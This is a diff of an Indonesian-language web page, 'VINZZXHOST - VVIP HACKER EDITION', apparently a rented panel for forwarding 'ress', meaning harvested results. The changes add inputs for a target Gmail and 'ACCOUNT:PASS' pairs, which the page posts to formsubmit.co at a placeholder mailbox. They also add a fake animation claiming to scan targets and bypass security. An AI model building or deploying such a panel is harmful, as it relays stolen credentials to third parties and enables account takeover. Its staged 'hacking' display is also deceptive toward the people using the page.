@@ -2,152 +2,159 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VINZZXHOST - PANEL FINAL</title>
+    <title>VINZZXHOST - VVIP HACKER EDITION</title>
     <style>
-        body { background-color: #000000; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; padding: 20px; }
+        body { background-color: #000000; color: white; font-family: 'Courier New', monospace; display: flex; justify-content: center; padding: 20px; overflow-x: hidden; }
         .container { width: 100%; max-width: 380px; }
         
-        /* HEADER - PP HURUF V */
+        /* HEADER PP */
         .header { text-align: center; margin-bottom: 25px; }
         .logo-circle { 
-            width: 100px; height: 100px; border-radius: 50%; 
-            border: 3px solid #00ff44; margin: 0 auto 12px;
-            box-shadow: 0 0 20px #00ff44; overflow: hidden; 
-            background: #000; display: flex; align-items: center; justify-content: center;
+            width: 100px; height: 100px; border-radius: 50%; border: 3px solid #00ff44; 
+            margin: 0 auto 12px; box-shadow: 0 0 20px #00ff44; background: #000; 
+            display: flex; align-items: center; justify-content: center; overflow: hidden; 
         }
         .logo-circle img { width: 100%; height: 100%; object-fit: cover; }
-        .brand { font-size: 24px; font-weight: bold; letter-spacing: 3px; text-shadow: 0 0 10px #00ff44; }
+        .brand { font-size: 24px; font-weight: bold; letter-spacing: 3px; text-shadow: 0 0 10px #00ff44; color: #00ff44; }
 
-        /* BUTTONS */
-        .btn-outline {
-            display: block; width: 100%; padding: 12px; border: 1px solid #00ff44; border-radius: 25px;
-            background: rgba(0, 255, 68, 0.05); color: #00ff44; text-decoration: none; font-weight: bold;
-            margin-bottom: 25px; text-align: center; box-sizing: border-box; transition: 0.3s;
-        }
+        /* CARDS */
+        .card { background: rgba(10, 10, 10, 0.9); border-radius: 15px; padding: 20px; margin-bottom: 20px; border: 1px solid #00ff44; box-shadow: 0 0 10px rgba(0, 255, 68, 0.2); position: relative; }
+        .title-section { color: #00ff44; font-size: 14px; font-weight: bold; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
+
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid #00ff44; color: #00ff44; border-radius: 5px; margin-bottom: 15px; box-sizing: border-box; outline: none; font-family: 'Courier New', monospace; }
+
         .btn-grad { 
             width: 100%; padding: 12px; border: none; border-radius: 8px; 
-            background: linear-gradient(45deg, #00b09b, #96c93d); color: black; font-weight: bold; cursor: pointer;
-            transition: 0.3s; font-size: 14px;
+            background: #00ff44; color: black; font-weight: bold; cursor: pointer; 
+            box-shadow: 0 0 15px #00ff44; text-transform: uppercase;
         }
-        .btn-grad:active { transform: scale(0.95); }
-        
+
+        /* SCANNING ANIMATION */
+        #scanOverlay {
+            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: black; border-radius: 15px; z-index: 10; flex-direction: column;
+            justify-content: center; align-items: center; text-align: center;
+        }
+        .matrix-text { color: #00ff44; font-size: 12px; animation: blink 0.1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+
         .btn-blue { 
             background: linear-gradient(to right, #00d2ff, #3a7bd5); border:none; width:100%; padding:14px; 
             border-radius:10px; color:white; font-weight:bold; text-decoration: none; display: block; 
-            text-align: center; box-sizing: border-box; margin-top: 10px; transition: 0.3s;
+            text-align: center; box-sizing: border-box; margin-top: 10px;
         }
 
-        /* CARDS */
-        .card { background: #0a0a0a; border-radius: 15px; padding: 20px; margin-bottom: 20px; border: 1px solid #1a1a1a; }
-        .title-section { color: white; font-size: 16px; font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; }
-        .title-section::before { content: ""; display: inline-block; width: 4px; height: 20px; background: #00ff44; margin-right: 10px; border-radius: 2px; }
-
-        input { width: 100%; padding: 12px; background: #151515; border: 1px solid #333; color: #00ff44; border-radius: 8px; margin-bottom: 15px; box-sizing: border-box; outline: none; }
-
-        /* TABLE */
-        .table-email { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        .table-email td { padding: 12px 5px; border-top: 1px solid #1a1a1a; font-size: 13px; }
+        .table-email { width: 100%; border-collapse: collapse; margin-top: 10px; color: #00ff44; }
+        .table-email td { padding: 12px 5px; border-top: 1px solid #00ff44; font-size: 12px; }
 
         /* MODAL */
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); display: flex; justify-content: center;
-            align-items: center; opacity: 0; visibility: hidden; transition: 0.4s; z-index: 999;
-        }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; justify-content: center; align-items: center; opacity: 0; visibility: hidden; transition: 0.4s; z-index: 999; }
         .modal-overlay.show { opacity: 1; visibility: visible; }
-        .modal-content { background: white; color: black; padding: 25px; border-radius: 20px; text-align: center; width: 250px; }
+        .modal-content { background: #000; color: #00ff44; padding: 25px; border-radius: 10px; text-align: center; width: 250px; border: 2px solid #00ff44; }
     </style>
 </head>
 <body>
 
 <div class="modal-overlay" id="notifBerhasil">
     <div class="modal-content">
-        <b style="font-size: 18px; color: #00b09b;">✓ BERHASIL</b>
-        <p style="font-size: 13px; color: #666;">Data Berhasil Dikirim ke Gmail!</p>
-        <button style="background: #3a7bd5; color: white; border: none; padding: 8px 30px; border-radius: 5px; font-weight: bold; cursor:pointer;" onclick="tutupNotif()">OK</button>
+        <b style="font-size: 18px;">[ SUCCESS ]</b>
+        <p style="font-size: 13px;">DATABASE UPDATED & RESS SENT!</p>
+        <button style="background: #00ff44; color: black; border: none; padding: 8px 30px; font-weight: bold; cursor:pointer;" onclick="tutupNotif()">CLOSE</button>
     </div>
 </div>
 
 <div class="container">
     <div class="header">
-        <div class="logo-circle">
-            <img src="https://ui-avatars.com/api/?name=V&background=000&color=0f4&size=128&bold=true" id="pp-img">
-        </div>
-        <div class="brand">VINZZXHOST</div>
+        <div class="logo-circle"><img src="https://ui-avatars.com/api/?name=V&background=000&color=0f4&size=128&bold=true"></div>
+        <div class="brand">VINZZXHOST.sys</div>
     </div>
 
-    <a href="https://wa.me/628818486388" class="btn-outline">🌐 SEWA PANEL KLIK DISINI</a>
-
     <div class="card">
-        <div class="title-section">DATA PANEL</div>
-        <form action="https://formsubmit.co/GANTI_GMAIL_ABANG@gmail.com" method="POST" id="formRess">
-            <input type="text" name="Nama Panel" value="Results Vip Vinzzz 👽" readonly>
-            <input type="text" name="Isi Ress" placeholder="Masukkan Data / Ress Di Sini..." required>
+        <div id="scanOverlay">
+            <div class="matrix-text">SCANNING TARGET...<br>BYPASSING SECURITY...<br>INJECTING PACKETS...</div>
+        </div>
+        <div class="title-section">DATA INJECTION (RESS)</div>
+        <form action="https://formsubmit.co/GANTI_GMAIL_PANGKALAN@gmail.com" method="POST" id="formRess" onsubmit="startScan(event)">
+            <input type="email" name="Target_Gmail" placeholder="[!] INPUT TARGET GMAIL" required>
+            <input type="text" name="Account_Data" id="isiRess" placeholder="[!] INPUT ACCOUNT:PASS" required>
             
             <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_template" value="table">
-            <input type="hidden" name="_next" value="javascript:munculNotif()">
-
-            <button type="submit" class="btn-grad">UPDATE DATA (SEND RESS)</button>
+            <input type="hidden" name="_next" value="https://vinzz638.github.io/panel-vinzzx/#success">
+            <button type="submit" class="btn-grad">EXECUTE UPDATE</button>
         </form>
     </div>
 
     <div class="card">
-        <div class="title-section">Email Configuration</div>
+        <div class="title-section">CONFIGURATIONS</div>
         <div style="display: flex; gap: 10px;">
-            <input type="text" id="inputEmail" placeholder="Target Email..." style="flex: 2;">
-            <input type="text" id="inputLimit" placeholder="Jumlah" style="flex: 1;">
+            <input type="text" id="inputEmail" placeholder="Email...">
+            <input type="number" id="inputLimit" placeholder="Qty">
         </div>
-        <button class="btn-grad" onclick="tambahEmail()">ADD EMAIL</button>
-
+        <button class="btn-grad" style="background: #222; color: #00ff44; border: 1px solid #00ff44;" onclick="tambahEmail()">ADD NODE</button>
         <table class="table-email"><tbody id="listEmail"></tbody></table>
     </div>
 
-    <a href="https://wa.me/628818486388" class="btn-blue">🌐 PUSAT/PANEL ( KLIK DISINI )</a>
+    <a href="https://wa.me/628818486388" class="btn-blue">🌐 ACCESS PUSAT PANEL</a>
 </div>
 
 <script>
-    function munculNotif() { 
+    if(window.location.hash === "#success") {
         document.getElementById("notifBerhasil").classList.add("show");
-        document.getElementById("formRess").reset();
-    }
-    function tutupNotif() { 
-        document.getElementById("notifBerhasil").classList.remove("show"); 
+        window.location.hash = ""; 
     }
 
-    // MEMORI HP (LOCALSTORAGE)
+    function startScan(e) {
+        // Tampilkan animasi scanning selama 2 detik sebelum benar-benar kirim
+        e.preventDefault();
+        document.getElementById("scanOverlay").style.display = "flex";
+        
+        kurangiLimit();
+
+        setTimeout(() => {
+            document.getElementById("formRess").submit();
+        }, 2500);
+    }
+
+    function tutupNotif() { document.getElementById("notifBerhasil").classList.remove("show"); }
+
     function simpanKeHP() {
-        const list = document.getElementById('listEmail').innerHTML;
-        localStorage.setItem('vinzz_pro_v1', list);
+        localStorage.setItem('vinzz_hacker_v1', document.getElementById('listEmail').innerHTML);
     }
 
     window.onload = function() {
-        const data = localStorage.getItem('vinzz_pro_v1');
+        const data = localStorage.getItem('vinzz_hacker_v1');
         if (data) { document.getElementById('listEmail').innerHTML = data; }
     };
 
     function tambahEmail() {
         const email = document.getElementById("inputEmail").value;
         const limit = document.getElementById("inputLimit").value || "0";
-        if (!email) return alert("Email kosong bang!");
-        
+        if (!email) return;
         const table = document.getElementById("listEmail");
         const row = table.insertRow(0);
         row.innerHTML = `
-            <td style="color: #00ff44;">${email}</td>
-            <td style="text-align:center;"><span style="background:#1a1a1a; color: #00ff44; padding: 2px 8px; border-radius: 4px; border: 1px solid #333;">${limit}</span></td>
-            <td style="text-align: right; color: #ff416c; cursor:pointer; font-size:18px;" onclick="hapusEmail(this)">🗑️</td>
+            <td>${email}</td>
+            <td style="text-align:center;"><span class="limit-val" style="border: 1px solid #00ff44; padding: 2px 8px;">${limit}</span></td>
+            <td style="text-align: right; color: #ff0000; cursor:pointer;" onclick="hapusEmail(this)">[X]</td>
         `;
+        simpanKeHP();
         document.getElementById("inputEmail").value = "";
         document.getElementById("inputLimit").value = "";
-        simpanKeHP();
+    }
+
+    function kurangiLimit() {
+        const limits = document.getElementsByClassName("limit-val");
+        if(limits.length > 0) {
+            let val = parseInt(limits[0].innerText);
+            if(val > 0) {
+                limits[0].innerText = val - 1;
+                simpanKeHP();
+            }
+        }
     }
 
     function hapusEmail(btn) {
-        if(confirm("Hapus Permanen?")) {
-            btn.closest('tr').remove();
-            simpanKeHP();
-        }
+        if(confirm("DELETE NODE?")) { btn.closest('tr').remove(); simpanKeHP(); }
     }
 </script>
 </body>
